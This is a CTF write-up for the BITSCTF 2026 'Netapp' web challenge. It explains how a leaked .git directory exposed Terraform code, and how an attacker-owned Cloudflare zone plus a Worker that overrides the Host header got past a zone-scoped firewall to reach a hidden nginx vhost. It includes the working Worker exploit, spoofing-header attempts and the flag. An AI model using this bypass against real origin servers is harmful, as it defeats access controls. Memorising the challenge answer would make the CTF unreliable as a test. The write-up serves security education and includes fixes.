# Netapp — BITSCTF 2026 Web Challenge Writeup (with Screenshots)

**Challenge:** Netapp
**Category:** Web
**Points:** 498
**Description:** *"We think our internal services are protected because we use netapp"*
**URL:** https://netapp.bitskrieg.in

---

## TL;DR

Exposed `.git` directory leaks Terraform infrastructure code revealing the origin server IP (`3.208.18.209`) and a hidden Cloudflare-protected domain (`bitsctf-2026.hvijay.dev`) with a WAF rule that blocks all traffic. The bypass: register our own domain on Cloudflare pointing to the same origin IP, then deploy a Cloudflare Worker that makes an HTTPS request through our zone (bypassing the target zone's firewall) while overriding the `Host` header to `bitsctf-2026.hvijay.dev`. The origin's nginx serves the flag based on the virtual host.

**Flag:** `BITSCTF{3v3n_41_15_84d_47_c0nf19u24710n}`

---

## Step 1: Initial Reconnaissance

Visiting `https://netapp.bitskrieg.in` presents a clean status dashboard titled **"Netapp — Secure cloud services by Netapp"**. The page shows three services:

| Service | Status |
|---------|--------|
| Web Portal | ONLINE |
| Auth Gateway | ONLINE |
| flag-service | **INTERNAL** |

At the bottom, a hint reads: *"All public endpoints are proxied through our edge network. Internal services are only accessible through our vpn."*

![Initial page source](writeup-screenshots/01-initial-page.png)

The page is entirely static HTML+CSS — no JavaScript, no forms, no API calls. Standard path fuzzing (`/admin`, `/api`, `/login`, `/flag`, etc.) returns only `404`.

The response headers immediately tell us we're behind **Cloudflare** (`server: cloudflare`, `cf-ray` header):

![Response headers showing Cloudflare](writeup-screenshots/02-response-headers.png)

The `server: cloudflare` and `cf-ray` headers confirm the site is behind Cloudflare's reverse proxy. This is a critical observation — it means we're not talking directly to the origin server.

---

## Step 2: Discovering the Exposed `.git` Directory

Testing for common sensitive file exposures, we probe `/.git/HEAD`:

![Exposed .git directory](writeup-screenshots/03-git-head.png)

The `.git` directory is publicly accessible. This is a critical information disclosure vulnerability. We can see:
- `HEAD` points to `refs/heads/main`
- The commit hash is `52f7105fa9fca1c69d50fbc0f6b8951a269d08a0`
- The `.git/config` reveals standard repository settings

We can now reconstruct the entire source repository by walking the git object graph.

---

## Step 3: Dumping and Analyzing the Git Repository

We download the commit, tree, and blob objects by fetching them from `.git/objects/<hash>` and decompressing with zlib. After reconstruction:

![Git log and repository contents](writeup-screenshots/04-git-log.png)

There is only a single commit (no `parent` line in the commit object), authored by **Krish (krxsh0x)**. The repository contains three files:

- `index.html` — the static dashboard page we already saw
- `flag-service/aws-security-group.tf` — AWS infrastructure configuration
- `flag-service/bitsctf-2026-vpn-only.tf` — Cloudflare firewall configuration

The two Terraform files under `flag-service/` are the key to solving this challenge.

---

## Step 4: Analyzing the Leaked Terraform Files

### 4.1 — `aws-security-group.tf` — Origin Server Details

```hcl
# EC2 instance IP - 3.208.18.209
terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region = var.aws_region
}

locals {
  cloudflare_ips = [
    "173.245.48.0/20",
    "103.21.244.0/22",
    "103.22.200.0/22",
    "103.31.4.0/22",
    "141.101.64.0/18",
    "108.162.192.0/18",
    "190.93.240.0/20",
    "188.114.96.0/20",
    "197.234.240.0/22",
    "198.41.128.0/17",
    "162.158.0.0/15",
    "104.16.0.0/13",
    "104.24.0.0/14",
    "172.64.0.0/13",
    "131.0.72.0/22"
  ]
}

resource "aws_security_group" "cf_only_web" {
  name        = "allow-cloudflare-only"
  description = "Allow HTTP/HTTPS only from Cloudflare"
  vpc_id      = var.vpc_id

  ingress {
    description = "HTTP from Cloudflare"
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = local.cloudflare_ips
  }

  ingress {
    description = "HTTPS from Cloudflare"
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = local.cloudflare_ips
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = {
    Name = "cf-only-web"
  }
}
```

**Key takeaways:**
- The **origin server IP** is `3.208.18.209` (AWS EC2 instance, comment on line 1)
- The **Security Group** only allows HTTP (port 80) and HTTPS (port 443) traffic from **Cloudflare's official proxy IP ranges**
- All 15 CIDR blocks listed match [Cloudflare's published IP ranges](https://www.cloudflare.com/ips/)
- Direct access to the origin from non-Cloudflare IPs is **blocked at the network level**

### 4.2 — `bitsctf-2026-vpn-only.tf` — Cloudflare Firewall Configuration

```hcl
provider "cloudflare" {
  # email   = "do not hardcode"
  # api_key = "do not hardcode"
}

data "cloudflare_zone" "example" {
  name = "hvijay.dev"
}

resource "cloudflare_filter" "vpn_access_filter" {
  zone_id     = data.cloudflare_zone.example.id
  description = "Filter for allowing only VPN access to bitsctf-2026.hvijay.dev"
  body        = "(http.host eq \"bitsctf-2026.hvijay.dev\") and (ip.src ne 0.0.0.0)"
}

resource "cloudflare_firewall_rule" "vpn_access_rule" {
  zone_id     = data.cloudflare_zone.example.id
  description = "Allow only VPN Access."
  action      = "block"
  priority    = 1
  filter      = cloudflare_filter.vpn_access_filter.id
}
```

**Key takeaways:**
- There is a **hidden domain**: `bitsctf-2026.hvijay.dev` on the Cloudflare zone `hvijay.dev`
- A **Cloudflare Firewall Rule** with `priority: 1` and `action: block` is applied
- The filter expression: `(http.host eq "bitsctf-2026.hvijay.dev") and (ip.src ne 0.0.0.0)`
- This blocks when the hostname matches **AND** the source IP is NOT `0.0.0.0`
- Since no real client will ever have `ip.src = 0.0.0.0`, this effectively **blocks everyone**
- The rule is **zone-scoped** — it only applies within the `hvijay.dev` Cloudflare zone

---

## Step 5: Verifying the Discovered Domain

We now know there's a hidden domain `bitsctf-2026.hvijay.dev`. Let's verify it exists and confirm it's blocked:

![Cloudflare WAF blocks the hidden domain](writeup-screenshots/06-blocked.png)

**Confirmed:** The domain exists, is on Cloudflare, and returns **HTTP 403** with Cloudflare's standard "Sorry, you have been blocked" page. The firewall rule is active.

The `/cdn-cgi/trace` endpoint is handled by Cloudflare's edge (bypasses WAF), so it responds even on the blocked domain:

![cdn-cgi/trace on both domains](writeup-screenshots/07-traces.png)

Both domains respond from the same Cloudflare POP (`colo=GRU`). The `warp=off` shows we're not on any VPN. Both show the same client IP.

---

## Step 6: Verifying Origin Access Restrictions

Direct connection to the origin IP times out completely (exit code 28 = connection timed out). The AWS Security Group is doing its job — only Cloudflare proxy IPs can reach ports 80/443:

![Direct origin access times out](writeup-screenshots/10-origin-blocked.png)

An nmap scan confirms the port filtering in detail:

![Nmap origin port scan](writeup-screenshots/05-nmap.png)

- **SSH (22):** Open — has a separate Security Group rule not shown in the leaked Terraform
- **HTTP (80):** Filtered — blocked by the SG for non-Cloudflare IPs
- **HTTPS (443):** Filtered — blocked by the SG for non-Cloudflare IPs

The reverse DNS (`ec2-3-208-18-209.compute-1.amazonaws.com`) confirms this is an AWS EC2 instance in `us-east-1`.

---

## Step 7: Understanding the Security Model

At this point we have a complete picture of the architecture:

```
                    +---------------------------------------+
                    |         Cloudflare Edge                |
                    |                                        |
  User ----------->|  Zone: bitskrieg.in                     |
                    |    netapp.bitskrieg.in --> 200 OK       |--> SG allows --> EC2 3.208.18.209
                    |                                        |                  (nginx)
                    |  Zone: hvijay.dev                      |    vhosts:
  User -----X----->|    bitsctf-2026.hvijay.dev              |    - netapp.bitskrieg.in -> static page
                    |    WAF: BLOCK if ip.src != 0.0.0.0     |    - bitsctf-2026.hvijay.dev -> FLAG
                    |                                        |    - default -> nginx welcome
                    +---------------------------------------+
```

**The challenge:** We need to reach the origin server (`3.208.18.209`) with `Host: bitsctf-2026.hvijay.dev`, but:

1. **Direct access** to the origin is blocked — the AWS Security Group only allows Cloudflare proxy IPs
2. **Through Cloudflare** with `Host: bitsctf-2026.hvijay.dev` is blocked — the WAF rule on the `hvijay.dev` zone blocks all requests

We need a request that:
- Travels through Cloudflare's network (so the source IP is a Cloudflare proxy IP -> passes the Security Group)
- Arrives at the origin with `Host: bitsctf-2026.hvijay.dev` (so nginx routes to the flag-service vhost)
- Does **NOT** pass through the `hvijay.dev` zone's WAF/firewall

---

## Step 8: Dead Ends (What Didn't Work)

Before finding the solution, we explored and ruled out several approaches:

### 8.1 — Cloudflare WARP VPN

The Terraform file is named `vpn-only`, suggesting a VPN-based approach. We set up Cloudflare WARP:

```bash
wgcf register --accept-tos
wgcf generate
sudo wg-quick up wgcf-profile
```

With WARP active, `/cdn-cgi/trace` showed `warp=on` and `ip.src` changed to `104.28.217.121` (a Cloudflare WARP exit IP). However, this is still not `0.0.0.0`, so the firewall continued to block us with 403.

### 8.2 — Worker Direct Fetch to the Blocked Domain

Deployed a Cloudflare Worker to fetch `bitsctf-2026.hvijay.dev` directly. The Worker's `ip.src` was a Cloudflare internal IPv6 (`2a06:98c0:3600::103`) — still not `0.0.0.0`, so the request was still blocked by the WAF.

### 8.3 — Worker TCP Sockets to Origin

Used the Cloudflare Workers `connect()` API to attempt a raw TCP connection to the origin. Connection timed out — Worker egress IPs are not in the Cloudflare proxy IP ranges allowed by the Security Group.

### 8.4 — Host Header Tricks

Attempted to bypass the WAF rule's string matching with trailing dots (`bitsctf-2026.hvijay.dev.`), uppercase (`BITSCTF-2026.HVIJAY.DEV`), and port suffixes (`bitsctf-2026.hvijay.dev:443`). All returned 403 — Cloudflare normalizes `http.host` before evaluating rules.

### 8.5 — IP Spoofing Headers

Attempted to set `X-Forwarded-For: 0.0.0.0`, `CF-Connecting-IP: 0.0.0.0`, and `True-Client-IP: 0.0.0.0`. All returned 403 — Cloudflare derives `ip.src` from the actual TCP connection, not from spoofable headers.

---

## Step 9: The Bypass — Cross-Zone Host Header Override

### The Key Insight

Cloudflare's WAF/firewall rules are **zone-scoped**. The block rule exists only on the `hvijay.dev` zone. If we route our request to the origin through a **different Cloudflare zone** (one we control, with no firewall rules), the `hvijay.dev` zone's firewall never triggers — because the request never passes through that zone.

### 9.1 — Set Up Our Own Cloudflare Zone

We need a domain on our own Cloudflare account pointing to the same origin IP:

1. **Add a domain** to our Cloudflare account (e.g., `attacker-domain.com`)
2. **Create an A record**: `proxy.attacker-domain.com` -> `3.208.18.209` with **Proxy enabled** (orange cloud icon)
3. **Update nameservers** at the registrar to Cloudflare's assigned nameservers
4. Wait for DNS propagation

### 9.2 — Verify Our Proxied Domain Reaches the Origin

Once DNS propagates, we verify our domain is reaching the origin through Cloudflare:

![Nginx default page via our proxy domain](writeup-screenshots/08-nginx-default.png)

We get the **nginx default welcome page**. This confirms:
- Our domain is proxied through Cloudflare (note `Server: cloudflare` and `CF-RAY` headers)
- Cloudflare connects to `3.208.18.209` using its proxy IPs -> AWS Security Group **allows** the connection
- The origin serves the default nginx vhost because `Host: proxy.attacker-domain.com` doesn't match any configured server block
- No WAF rules block us because our zone has none configured

### 9.3 — Deploy a Cloudflare Worker with Host Header Override

The origin's nginx uses virtual hosting — it serves the flag only when it receives `Host: bitsctf-2026.hvijay.dev`. We need to change the Host header that reaches the origin.

Since **Origin Rules** (Host Header Override) requires a paid Cloudflare plan, we use a **Cloudflare Worker** instead. Workers can override the Host header on HTTPS `fetch()` calls:

```javascript
// worker.js
export default {
  async fetch(request) {
    try {
      const results = [];

      // Test 1: HTTP fetch with Host override (for comparison)
      try {
        const resp = await fetch("http://proxy.attacker-domain.com/", {
          headers: {
            "Host": "bitsctf-2026.hvijay.dev",
            "User-Agent": "Mozilla/5.0"
          }
        });
        const body = await resp.text();
        results.push(
          "T1 fetch HTTP + Host:hvijay → " + resp.status +
          " size=" + body.length + "\n" + body.substring(0, 2000)
        );
      } catch (e) { results.push("T1 error: " + e.message); }

      // Test 2: HTTPS fetch with Host override (THE ACTUAL EXPLOIT)
      try {
        const resp = await fetch("https://proxy.attacker-domain.com/", {
          headers: {
            "Host": "bitsctf-2026.hvijay.dev",
            "User-Agent": "Mozilla/5.0"
          }
        });
        const body = await resp.text();
        results.push(
          "T2 HTTPS + Host:hvijay → " + resp.status +
          " size=" + body.length + "\n" + body.substring(0, 2000)
        );
      } catch (e) { results.push("T2 error: " + e.message); }

      return new Response(results.join("\n\n===\n\n"), {
        headers: { "Content-Type": "text/plain; charset=utf-8" },
      });
    } catch (e) {
      return new Response("Global error: " + e.message, { status: 500 });
    }
  },
};
```

Deploy with Wrangler:

```bash
npx wrangler deploy
```

### 9.4 — Get the Flag

![Worker output - FLAG CAPTURED](writeup-screenshots/09-flag.png)

- **T1 (HTTP)** returned the nginx default page (size=615) — the Host header override is **NOT honored** for HTTP `fetch()` in Cloudflare Workers
- **T2 (HTTPS)** returned the **FLAG** (size=40) — the Host header override **IS honored** for HTTPS `fetch()`, so nginx received `Host: bitsctf-2026.hvijay.dev` and served the flag-service vhost

---

## Step 10: Why This Works — Full Request Flow

```
1. We call: curl https://our-worker.workers.dev/
   → Reaches our Cloudflare Worker on workers.dev

2. Worker executes: fetch("https://proxy.attacker-domain.com/", {
     headers: { "Host": "bitsctf-2026.hvijay.dev" }
   })

3. Cloudflare routes the request based on the URL hostname:
   → proxy.attacker-domain.com is in OUR Cloudflare zone
   → OUR zone has NO WAF/firewall rules
   → Request passes through without any blocking

4. Cloudflare's reverse proxy connects to the origin (3.208.18.209)
   using Cloudflare proxy IPs (e.g., from 172.64.0.0/13)
   → AWS Security Group ALLOWS the connection (IP is in the allowlist)

5. The HTTPS request arrives at the origin nginx with the overridden
   Host header: bitsctf-2026.hvijay.dev

6. Nginx matches server_name bitsctf-2026.hvijay.dev
   → Serves the flag-service virtual host
   → Returns: BITSCTF{3v3n_41_15_84d_47_c0nf19u24710n}
```

### Why HTTPS but not HTTP?

For HTTPS `fetch()` in Cloudflare Workers, the explicitly set `Host` header is forwarded to the origin. This is because HTTPS requires proper TLS handling with the Host/SNI matching, and the Worker runtime honors the explicitly set `Host` header.

For HTTP `fetch()`, Cloudflare automatically overrides the `Host` header with the URL's hostname (`proxy.attacker-domain.com`), ignoring any custom `Host` header. This is why T1 returned the nginx default page (it received `Host: proxy.attacker-domain.com`, which has no matching vhost).

---

## Step 11: Root Cause — The Vulnerability

The bypass exploits three fundamental architectural weaknesses:

1. **Cloudflare WAF rules are zone-scoped:** Firewall rules configured on the `hvijay.dev` zone cannot affect requests that route through a completely different zone. Each Cloudflare zone is an independent security boundary.

2. **The origin trusts any Cloudflare proxy IP equally:** The AWS Security Group allows all 15 Cloudflare IP ranges without distinction. It cannot differentiate between a request coming from the legitimate `hvijay.dev` zone and one coming from an attacker-controlled zone. All Cloudflare zones share the same proxy IP pools.

3. **Virtual host routing relies solely on the Host header:** The origin's nginx makes routing decisions based entirely on the `Host` header with no additional verification (e.g., shared secret, mTLS client certificate, or Cloudflare Authenticated Origin Pull) to confirm the request originated from the authorized Cloudflare zone.

### How to Fix This

To properly protect the origin, the challenge setup would need one or more of:
- **Cloudflare Authenticated Origin Pulls** — mutual TLS between Cloudflare and the origin, with a per-zone client certificate
- **A shared secret header** (e.g., `CF-Access-Client-Secret`) validated by the origin's nginx
- **Cloudflare Tunnel** (`cloudflared`) instead of exposing the origin IP, which eliminates direct IP access entirely
- **IP-based restrictions at the origin** that go beyond just "is it a Cloudflare IP"

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Visit `netapp.bitskrieg.in` | Static dashboard showing `flag-service` as INTERNAL |
| 2 | Probe `/.git/HEAD` | Exposed git repository discovered |
| 3 | Dump git objects | Retrieved 3 files including Terraform infrastructure code |
| 4 | Analyze `aws-security-group.tf` | Origin IP: `3.208.18.209`, SG allows only Cloudflare IPs |
| 5 | Analyze `bitsctf-2026-vpn-only.tf` | Hidden domain `bitsctf-2026.hvijay.dev` with WAF blocking all traffic |
| 6 | Verify origin restrictions | Direct access times out, nmap confirms ports 80/443 filtered |
| 7 | Register our domain on Cloudflare | A record -> `3.208.18.209` with proxy enabled |
| 8 | Access our proxied domain | Nginx default page — confirms origin reachable through our zone |
| 9 | Deploy Cloudflare Worker | HTTPS fetch to our domain with `Host: bitsctf-2026.hvijay.dev` |
| 10 | Access the Worker | **`BITSCTF{3v3n_41_15_84d_47_c0nf19u24710n}`** |

---

## Flag

```
BITSCTF{3v3n_41_15_84d_47_c0nf19u24710n}
```

*"even AI is bad at configuration"* — a fitting commentary on the misconfigured trust boundaries between Cloudflare zones and origin servers.
